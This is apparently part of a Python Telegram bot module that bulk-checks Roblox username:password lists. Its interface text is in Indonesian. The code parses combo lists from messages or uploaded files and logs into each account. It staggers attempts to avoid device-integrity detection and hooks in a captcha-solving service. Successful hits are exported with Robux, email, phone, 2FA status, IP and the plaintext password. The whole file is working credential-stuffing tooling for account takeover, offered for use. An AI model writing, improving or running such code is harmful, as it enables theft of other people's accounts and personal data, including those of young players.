def bulk_check(creds: list[tuple[str, str]], max_workers: int = ROBLOX_MAX_WORKERS,
               progress_cb: Callable | None = None) -> list[RobloxResult]:
    done = [0]
    total = len(creds)
    lock = threading.Lock()

    def _worker(idx_pair):
        idx, (user, pwd) = idx_pair
        time.sleep(min(idx * 0.8, 8.0))  # stagger — deviceintegrity fragile if burst
        with _login_semaphore:
            res = check_single_account(user, pwd)
        with lock:
            done[0] += 1
            cur = done[0]
        if progress_cb:
            try:
                progress_cb(cur, total)
            except Exception:
                pass
        return res

    workers = min(max_workers, 4)  # keep login concurrency low
    with ThreadPoolExecutor(max_workers=workers) as pool:
        results = list(pool.map(_worker, enumerate(creds)))
    return results


# ══════════════════════════════════════════════════════════════
#  Credential Parsing
# ══════════════════════════════════════════════════════════════

_RE_USERPASS_LINE = re.compile(
    r'(?:user(?:name)?|akun)\s*[:=]\s*(\S+)', re.IGNORECASE
)
_RE_PASSLINE = re.compile(
    r'(?:pass(?:word)?|pw|sandi)\s*[:=]\s*(\S+)', re.IGNORECASE
)

def parse_credentials(text: str) -> list[tuple[str, str]]:
    """Parse username:password from various formats."""
    creds = []
    lines = text.splitlines()

    pending_user = None
    for line in lines:
        line = line.strip()
        if not line:
            pending_user = None
            continue

        line_clean = re.sub(r'\x1b\[[0-9;]*m', '', line)
        line_clean = line_clean.strip()
        if not line_clean:
            continue

        um = _RE_USERPASS_LINE.search(line_clean)
        pm = _RE_PASSLINE.search(line_clean)

        if um and pm:
            creds.append((um.group(1), pm.group(1)))
            pending_user = None
            continue

        if um:
            pending_user = um.group(1)
            continue
        if pm and pending_user:
            creds.append((pending_user, pm.group(1)))
            pending_user = None
            continue

        for sep in ['|', ':', ';', '\t']:
            if sep in line_clean:
                parts = line_clean.split(sep, 1)
                if len(parts) == 2:
                    u, p = parts[0].strip(), parts[1].strip()
                    if u and p and 2 <= len(u) <= 50 and 3 <= len(p) <= 80:
                        if not re.match(r'^https?://', u, re.IGNORECASE) and not u.startswith('['):
                            creds.append((u, p))
                            break

    seen = set()
    unique = []
    for u, p in creds:
        key = (u.lower(), p)
        if key not in seen:
            seen.add(key)
            unique.append((u, p))
    return unique


# ══════════════════════════════════════════════════════════════
#  Telegram Integration
# ══════════════════════════════════════════════════════════════

_roblox_active = {}

def roblox_init(em_func, screen_func, is_allowed_func, get_addusers_func, owner_id, emojis_map, captcha_api_key: str = ""):
    """Called once from dik.py to inject shared helpers."""
    global em, _screen, _is_allowed_user, _get_all_addusers, USER_ID, EMOJIS
    global E1, E2, E3, E4, E5, E6
    global CE_LOADING, CE_FILE, CE_PROFILE, CE_WAKTU, CE_EMAIL, CE_NOMOR
    global CE_DETAIL_NAME, CE_DETAIL_ID, CE_DETAIL_DATE, CE_LIVE, CE_NEGARA
    global CE_HELP, CE_CHECK, CE_SETTINGS, CE_AKUN, CE_EXPORT, CE_DETAIL_GEM
    global CAPTCHA_SOLVER_KEY
    em = em_func
    _screen = screen_func
    _is_allowed_user = is_allowed_func
    _get_all_addusers = get_addusers_func
    USER_ID = owner_id
    EMOJIS = emojis_map
    if (captcha_api_key or "").strip():
        CAPTCHA_SOLVER_KEY = captcha_api_key.strip()
        os.environ.setdefault("CAPSOLVER_API_KEY", CAPTCHA_SOLVER_KEY)
    E1 = emojis_map.get("E1", "5796205953913196373")
    E2 = emojis_map.get("E2", "5420323339723881652")
    E3 = emojis_map.get("E3", "4956337889593000947")
    E4 = emojis_map.get("E4", "5438467424770867483")
    E5 = emojis_map.get("E5", "5438436750114439411")
    E6 = emojis_map.get("E6", "6003769830564434518")
    CE_LOADING = emojis_map.get("CE_LOADING", "5256024382337205926")
    CE_FILE = emojis_map.get("CE_FILE", "5870570722778156940")
    CE_PROFILE = emojis_map.get("CE_PROFILE", "5870994129244131212")
    CE_WAKTU = emojis_map.get("CE_WAKTU", "5872756762347573066")
    CE_EMAIL = emojis_map.get("CE_EMAIL", "5472239203590888751")
    CE_NOMOR = emojis_map.get("CE_NOMOR", "5422696450888842691")
    CE_DETAIL_NAME = emojis_map.get("CE_DETAIL_NAME", "5316887736823591263")
    CE_DETAIL_ID = emojis_map.get("CE_DETAIL_ID", "5262690351969215936")
    CE_DETAIL_DATE = emojis_map.get("CE_DETAIL_DATE", "5976320879259293509")
    CE_LIVE = emojis_map.get("CE_LIVE", "5870903672937911120")
    CE_NEGARA = emojis_map.get("CE_NEGARA", "5240097896279326170")
    CE_HELP = emojis_map.get("CE_HELP", "5870570722778156940")
    CE_CHECK = emojis_map.get("CE_CHECK", "5465443379917629504")
    CE_SETTINGS = emojis_map.get("CE_SETTINGS", "5330237710655306682")
    CE_AKUN = emojis_map.get("CE_AKUN", "5256143829672672750")
    CE_EXPORT = emojis_map.get("CE_EXPORT", "5258043150110301407")
    CE_DETAIL_GEM = emojis_map.get("CE_DETAIL_GEM", "5330237710655306682")


def _format_single(r: RobloxResult) -> str:
    """Format one account result as blockquote HTML — no custom emojis."""
    if not r.ok:
        reason = _html.escape(r.error or "Unknown error")
        return (
            f"<blockquote>"
            f"<b>{_html.escape(r.username)}</b>\n"
            f"──────────────────────\n"
            f"<b>Login Gagal</b>\n\n"
            f"  User: <code>{_html.escape(r.username)}</code>\n"
            f"  Error: {reason}\n"
            f"\n{r.elapsed:.1f}s"
            f"</blockquote>"
        )

    lines = [
        f"<b>{_html.escape(r.display_name or r.username)}</b>",
        f"──────────────────────",
        f"<b>Login Berhasil</b>\n",
        f"  Username: <code>{_html.escape(r.username)}</code>",
        f"  User ID: <code>{r.user_id}</code>",
    ]
    if r.display_name and r.display_name != r.username:
        lines.append(f"  Display: <b>{_html.escape(r.display_name)}</b>")
    if r.description:
        lines.append(f"  Bio: <i>{_html.escape(r.description[:100])}</i>")
    if r.created:
        lines.append(f"  Dibuat: <code>{r.created}</code>")
    if r.account_age_days:
        lines.append(f"  Umur: <b>{r.account_age_days}</b> hari")

    lines.append("")
    lines.append(f"  Robux: <b>{r.robux:,}</b>")
    lines.append(f"  Premium: <b>{'Ya' if r.premium else 'Tidak'}</b>")
    if r.can_trade:
        lines.append(f"  Trade: <b>Aktif</b>")

    lines.append("")
    if r.email:
        v = "verified" if r.email_verified else "unverified"
        lines.append(f"  Email: <code>{_html.escape(r.email)}</code> ({v})")
    else:
        lines.append(f"  Email: <i>Tidak ada</i>")
    lines.append(f"  Phone: <b>{'Verified' if r.phone_verified else 'Tidak'}</b>")
    if r.country:
        lines.append(f"  Negara: <b>{_html.escape(r.country)}</b>")
    if r.birthdate:
        lines.append(f"  Lahir: <code>{r.birthdate}</code>")
    if r.gender and r.gender != "Unknown":
        lines.append(f"  Gender: <b>{r.gender}</b>")

    lines.append("")
    lines.append(f"  Friends: <b>{r.friends_count}</b>  |  Requests: <b>{r.friend_requests}</b>")
    lines.append(f"  Followers: <b>{r.followers_count}</b>  |  Following: <b>{r.followings_count}</b>")
    if r.groups:
        g_list = ", ".join(r.groups[:5])
        lines.append(f"  Groups: <b>{len(r.groups)}</b> ({_html.escape(g_list)})")
    if r.messages_unread:
        lines.append(f"  Pesan Unread: <b>{r.messages_unread}</b>")

    lines.append("")
    if r.two_fa_enabled:
        methods_str = ", ".join(r.two_fa_methods) or "Aktif"
        lines.append(f"  2FA: <b>{_html.escape(methods_str)}</b>")
    else:
        lines.append(f"  2FA: <b>Tidak aktif</b>")
    if r.passkeys:
        pk_str = ", ".join(r.passkeys)
        lines.append(f"  Passkey: <b>{_html.escape(pk_str)}</b>")
    if r.voice_enabled:
        lines.append(f"  Voice: <b>Aktif</b>" + (" (Verified)" if r.voice_verified else ""))
    if r.xbox_connected:
        lines.append(f"  Xbox: <b>Terhubung</b>")

    if r.is_banned:
        lines.append(f"\n  <b>** BANNED **</b>")

    if r.avatar_url:
        lines.append(f"\n  <a href=\"{r.avatar_url}\">Avatar</a>  |  <a href=\"{r.profile_url}\">Profile</a>")
    else:
        lines.append(f"\n  <a href=\"{r.profile_url}\">Profile Link</a>")

    if r.ip_address:
        lines.append(f"  IP: <code>{_html.escape(r.ip_address)}</code>")

    lines.append(f"\n{r.elapsed:.1f}s")
    return "<blockquote>" + "\n".join(lines) + "</blockquote>"


def _format_file_entry(idx: int, r: RobloxResult) -> str:
    """Plain-text entry for file export — no emojis, clean."""
    if not r.ok:
        return (
            f"  [{idx:>3}] {r.username}:{r.password}\n"
            f"        > GAGAL: {r.error or 'Login Failed'}\n"
        )
    lines = [f"  [{idx:>3}] {r.username}:{r.password}"]
    lines.append(f"        ID         : {r.user_id}")
    if r.display_name and r.display_name != r.username:
        lines.append(f"        Display    : {r.display_name}")
    lines.append(f"        Robux      : {r.robux:,}")
    lines.append(f"        Premium    : {'Ya' if r.premium else 'Tidak'}")
    if r.email:
        lines.append(f"        Email      : {r.email} ({'verified' if r.email_verified else 'unverified'})")
    lines.append(f"        Phone      : {'Verified' if r.phone_verified else 'Tidak'}")
    if r.country:
        lines.append(f"        Negara     : {r.country}")
    if r.birthdate:
        lines.append(f"        Lahir      : {r.birthdate}")
    lines.append(f"        Friends    : {r.friends_count}  |  Requests: {r.friend_requests}")
    lines.append(f"        Followers  : {r.followers_count}  |  Following: {r.followings_count}")
    if r.groups:
        lines.append(f"        Groups     : {len(r.groups)} ({', '.join(r.groups[:5])})")
    if r.two_fa_enabled:
        lines.append(f"        2FA        : {', '.join(r.two_fa_methods) or 'Aktif'}")
    else:
        lines.append(f"        2FA        : Tidak")
    if r.passkeys:
        lines.append(f"        Passkey    : {', '.join(r.passkeys)}")
    if r.voice_enabled:
        lines.append(f"        Voice      : Aktif" + (" (Verified)" if r.voice_verified else ""))
    if r.is_banned:
        lines.append(f"        ** BANNED **")
    if r.ip_address:
        lines.append(f"        IP         : {r.ip_address}")
    if r.account_age_days:
        lines.append(f"        Umur       : {r.account_age_days} hari")
    if r.created:
        lines.append(f"        Dibuat     : {r.created}")
    lines.append(f"        Profile    : {r.profile_url}")
    if r.avatar_url:
        lines.append(f"        Avatar     : {r.avatar_url}")
    return "\n".join(lines) + "\n"


# ── Telegram command handlers ──

async def roblox_command(update, context):
    """Handle /roblox command."""
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.constants import ParseMode

    user_id = update.effective_user.id
    if not _is_allowed_user(user_id):
        return

    if _roblox_active.get(user_id):
        await update.message.reply_text(
            _screen('ROBLOX CHECKER', (
                f"{em(E2, '⚠️')} <b>Masih ada proses berjalan!</b>\n\n"
                f"Tunggu selesai dulu ya."
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    reply = update.message.reply_to_message
    creds = []

    if reply and reply.document and reply.document.file_name and reply.document.file_name.lower().endswith('.txt'):
        file = await context.bot.get_file(reply.document.file_id)
        raw = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
        creds = parse_credentials(raw)
        if not creds:
            await update.message.reply_text(
                _screen('ROBLOX CHECKER', (
                    f"{em(E2, '❌')} <b>Tidak ada akun valid di file!</b>\n\n"
                    f"Format yang didukung:\n"
                    f"  <code>username|password</code>\n"
                    f"  <code>username:password</code>\n"
                    f"  <code>User: xxx</code> + <code>Pass: yyy</code>"
                )),
                parse_mode=ParseMode.HTML,
            )
            return
    else:
        raw_text = " ".join(context.args) if context.args else ""
        if not raw_text:
            await update.message.reply_text(
                _screen('ROBLOX CHECKER', (
                    f"{em(CE_ROBLOX, '🎮')} <b>ROBLOX ACCOUNT CHECKER</b>\n"
                    f"────────────────────────────\n\n"
                    f"Cek akun Roblox dan dapatkan info lengkap.\n\n"
                    f"<b>{em(CE_HELP, '📖')} Cara pakai:</b>\n"
                    f"  {em(E6, '🚀')} <code>/roblox user|pass</code>\n"
                    f"  {em(E6, '🚀')} <code>/roblox user:pass</code>\n"
                    f"  {em(E6, '🚀')} <code>/roblox user1|pass1 user2|pass2</code>\n"
                    f"  {em(CE_FILE, '📁')} Reply file <code>.txt</code> dengan <code>/roblox</code>\n\n"
                    f"<b>{em(E1, '✅')} Data yang didapat:</b>\n"
                    f"  {em(CE_DETAIL_NAME, '👤')} Username, Display Name, Bio\n"
                    f"  {em(CE_DETAIL_GEM, '💎')} Robux, Premium, Trade\n"
                    f"  {em(CE_EMAIL, '📩')} Email, Phone, Negara\n"
                    f"  {em(CE_LIVE, '👥')} Friends, Followers, Groups\n"
                    f"  {em(E1, '🔒')} 2FA, Passkey, Voice Chat\n"
                    f"  {em(CE_PROFILE, '🖼')} Avatar, Profile Link, IP\n\n"
                    f"<b>{em(E6, '🚀')} Fitur:</b>\n"
                    f"  {em(CE_LIVE, '📡')} {ROBLOX_MAX_WORKERS} worker paralel\n"
                    f"  {em(CE_FILE, '📁')} Auto export .txt jika banyak akun\n\n"
                    f"{em(CE_WAKTU, '⏲')} <i>Support berbagai format file</i>"
                ), 'Home › Roblox'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("CEK AKUN", callback_data=f"roblox_help_{user_id}",
                        api_kwargs={"style": "primary", "icon_custom_emoji_id": CE_ROBLOX}),
                    InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", style="danger"),
                ]]),
            )
            return

        creds = parse_credentials(raw_text)
        if not creds:
            await update.message.reply_text(
                _screen('ROBLOX CHECKER', (
                    f"{em(E2, '❌')} <b>Format tidak valid!</b>\n\n"
                    f"Contoh: <code>/roblox username|password</code>\n"
                    f"atau: <code>/roblox user:pass</code>"
                )),
                parse_mode=ParseMode.HTML,
            )
            return

    context.user_data[f"roblox_creds_{user_id}"] = creds

    preview = "\n".join([f"  <code>{_html.escape(u)}</code>" for u, p in creds[:8]])
    if len(creds) > 8:
        preview += f"\n  <i>... +{len(creds) - 8} lagi</i>"

    await update.message.reply_text(
        _screen('ROBLOX CHECKER', (
            f"{em(CE_ROBLOX, '🎮')} <b>ROBLOX CHECKER</b>\n"
            f"────────────────────────────\n\n"
            f"  {em(CE_AKUN, '👤')} <b>Akun:</b> {len(creds)} target\n\n"
            f"{preview}\n\n"
            f"  {em(CE_LIVE, '📡')} Worker: <b>{ROBLOX_MAX_WORKERS}</b>\n"
            f"  {em(CE_WAKTU, '⏲')} Est: ~{max(5, len(creds) * 4 // ROBLOX_MAX_WORKERS + 3)}s\n\n"
            f"Mulai check?"
        ), 'Home › Roblox'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("MULAI CHECK", callback_data=f"roblox_start_{user_id}",
                    api_kwargs={"style": "success", "icon_custom_emoji_id": CE_ROBLOX}),
            ],
            [
                InlineKeyboardButton("BATAL", callback_data=f"menu_start_{user_id}", style="danger"),
            ],
        ]),
    )


async def roblox_callback(update, context):
    """Handle all roblox_* callback data."""
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.constants import ParseMode

    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if not _is_allowed_user(user_id):
        await query.answer("Akses ditolak", show_alert=True)
        return

    if data.startswith("roblox_help_"):
        await query.answer()
        await query.message.edit_text(
            _screen('ROBLOX CHECKER', (
                f"{em(CE_ROBLOX, '🎮')} <b>CARA PAKAI</b>\n"
                f"────────────────────────────\n\n"
                f"<b>{em(CE_HELP, '📖')} Command:</b>\n"
                f"  <code>/roblox username|password</code>\n"
                f"  <code>/roblox user:pass user2:pass2</code>\n\n"
                f"<b>{em(CE_FILE, '📁')} File .txt:</b>\n"
                f"  Reply file <code>.txt</code> dengan <code>/roblox</code>\n\n"
                f"<b>Format file yang didukung:</b>\n"
                f"  <code>username|password</code>\n"
                f"  <code>username:password</code>\n"
                f"  <code>User: xxx</code> + <code>Pass: yyy</code>\n"
                f"  <code>Username: xxx Password: yyy</code>"
            ), 'Home › Roblox › Help'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", style="danger"),
            ]]),
        )
        return

    if data.startswith("roblox_start_"):
        await query.answer()
        creds = context.user_data.get(f"roblox_creds_{user_id}")
        if not creds:
            await query.message.edit_text(
                _screen('ROBLOX CHECKER', f"{em(E2, '❌')} Data akun tidak ditemukan. Kirim ulang /roblox."),
                parse_mode=ParseMode.HTML,
            )
            return
        asyncio.create_task(_roblox_process(query, context, creds, user_id))
        return


async def _roblox_process(query, context, creds, user_id):
    """Process the actual check."""
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.constants import ParseMode
    from telegram.error import BadRequest

    _roblox_active[user_id] = True
    msg = query.message
    total = len(creds)
    loop = asyncio.get_event_loop()
    finished = [False]

    await msg.edit_text(
        _screen('ROBLOX CHECKER', (
            f"{em(CE_ROBLOX, '🎮')} <b>ROBLOX CHECKER</b>\n"
            f"────────────────────────────\n\n"
            f"  {em(CE_AKUN, '👤')} Total: <b>{total}</b> akun\n"
            f"  {em(CE_LIVE, '📡')} Worker: <b>{min(ROBLOX_MAX_WORKERS, 4)}</b>\n"
            f"  {em(CE_LOADING, '🔄')} Progress: 0/{total} (0%)\n\n"
            f"  <code>[░░░░░░░░░░] 0%</code>"
        ), 'Home › Roblox › Processing'),
        parse_mode=ParseMode.HTML,
    )

    last_upd = [0.0]

    def _progress(done, tot):
        if finished[0]:
            return
        now = time.time()
        if now - last_upd[0] < 3.0 and done < tot:
            return
        last_upd[0] = now
        pct = int(done / tot * 100) if tot else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)

        async def _safe_edit():
            if finished[0]:
                return
            try:
                await msg.edit_text(
                    _screen('ROBLOX CHECKER', (
                        f"{em(CE_ROBLOX, '🎮')} <b>ROBLOX CHECKER</b>\n"
                        f"────────────────────────────\n\n"
                        f"  {em(CE_AKUN, '👤')} Total: <b>{tot}</b> akun\n"
                        f"  {em(CE_LIVE, '📡')} Worker: <b>{min(ROBLOX_MAX_WORKERS, 4)}</b>\n"
                        f"  {em(E1, '✅')} Progress: {done}/{tot} ({pct}%)\n\n"
                        f"  <code>[{bar}] {pct}%</code>"
                    ), 'Home › Roblox › Processing'),
                    parse_mode=ParseMode.HTML,
                )
            except BadRequest:
                pass
            except Exception:
                pass

        loop.call_soon_threadsafe(lambda: asyncio.create_task(_safe_edit()))

    try:
        results = await loop.run_in_executor(
            None, lambda: bulk_check(creds, max_workers=ROBLOX_MAX_WORKERS, progress_cb=_progress)
        )
    except Exception as e:
        finished[0] = True
        _roblox_active[user_id] = False
        try:
            await msg.edit_text(
                _screen('ROBLOX CHECKER', f"{em(E2, '❌')} Error: {_html.escape(str(e)[:300])}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    finished[0] = True
    _roblox_active[user_id] = False

    success = [r for r in results if r.ok]
    failed = [r for r in results if not r.ok]
    total_robux = sum(r.robux for r in success)
    premium_count = sum(1 for r in success if r.premium)

    chat_id = msg.chat_id

    # Stop editing progress before delete
    await asyncio.sleep(0.2)
    try:
        await msg.delete()
    except Exception:
        pass

    if len(results) <= 3:
        parts = [_format_single(r) for r in results]
        summary = _screen(
            'ROBLOX CHECKER',
            (
                f"{em(CE_ROBLOX, '🎮')} <b>HASIL CHECK</b>\n"
                f"────────────────────────────\n\n"
                f"  {em(E1, '✅')} Berhasil: <b>{len(success)}</b>\n"
                f"  {em(E2, '❌')} Gagal: <b>{len(failed)}</b>\n"
                f"  {em(CE_DETAIL_GEM, '💎')} Total Robux: <b>{total_robux:,}</b>\n"
                f"  {em(CE_SETTINGS, '⭐')} Premium: <b>{premium_count}</b>"
            ),
            'Home › Roblox › Results',
        )
        try:
            await msg._bot.send_message(chat_id, "\n".join(parts) + "\n" + summary, parse_mode=ParseMode.HTML)
        except Exception:
            for p in parts:
                try:
                    await msg._bot.send_message(chat_id, p, parse_mode=ParseMode.HTML)
                except Exception:
                    pass
            try:
                await msg._bot.send_message(chat_id, summary, parse_mode=ParseMode.HTML)
            except Exception:
                pass
    else:
        file_lines = []
        file_lines.append(f"{'═' * 40}")
        file_lines.append(f"   ROBLOX ACCOUNT CHECKER")
        file_lines.append(f"   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        file_lines.append(f"{'═' * 40}")
        file_lines.append(f"   Berhasil  : {len(success)}")
        file_lines.append(f"   Gagal     : {len(failed)}")
        file_lines.append(f"   Robux     : {total_robux:,}")
        file_lines.append(f"   Premium   : {premium_count}")
        file_lines.append(f"{'═' * 40}")
        file_lines.append("")

        if success:
            file_lines.append(f"┏{'━' * 38}┓")
            file_lines.append(f"┃  LOGIN BERHASIL ({len(success)} akun)")
            file_lines.append(f"┗{'━' * 38}┛")
            file_lines.append("")
            for idx, r in enumerate(success, 1):
                file_lines.append(_format_file_entry(idx, r))
            file_lines.append("")

        if failed:
            file_lines.append(f"┏{'━' * 38}┓")
            file_lines.append(f"┃  LOGIN GAGAL ({len(failed)} akun)")
            file_lines.append(f"┗{'━' * 38}┛")
            file_lines.append("")
            for idx, r in enumerate(failed, 1):
                file_lines.append(_format_file_entry(idx, r))
            file_lines.append("")

        file_lines.append(f"{'═' * 40}")
        file_lines.append(f"   Powered by DikZz")
        file_lines.append(f"{'═' * 40}")

        content = "\n".join(file_lines)
        fname = f"roblox_{datetime.now().strftime('%H%M%S')}.txt"
        bio = io.BytesIO(content.encode("utf-8"))
        bio.name = fname

        caption = _screen(
            'ROBLOX CHECKER',
            (
                f"{em(CE_ROBLOX, '🎮')} <b>HASIL CHECK</b>\n"
                f"────────────────────────────\n\n"
                f"  {em(E1, '✅')} Berhasil: <b>{len(success)}</b>\n"
                f"  {em(E2, '❌')} Gagal: <b>{len(failed)}</b>\n"
                f"  {em(CE_DETAIL_GEM, '💎')} Total Robux: <b>{total_robux:,}</b>\n"
                f"  {em(CE_SETTINGS, '⭐')} Premium: <b>{premium_count}</b>\n\n"
                f"  {em(CE_FILE, '📁')} File: <code>{fname}</code>"
            ),
            'Home › Roblox › Results',
        )

        try:
            await msg._bot.send_document(
                chat_id=chat_id,
                document=bio,
                filename=fname,
                caption=caption,
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            log.warning("Failed to send roblox result file: %s", e)
            try:
                await msg._bot.send_message(chat_id, caption, parse_mode=ParseMode.HTML)
            except Exception:
                pass


def is_roblox_callback(data: str) -> bool:
    return data.startswith("roblox_")
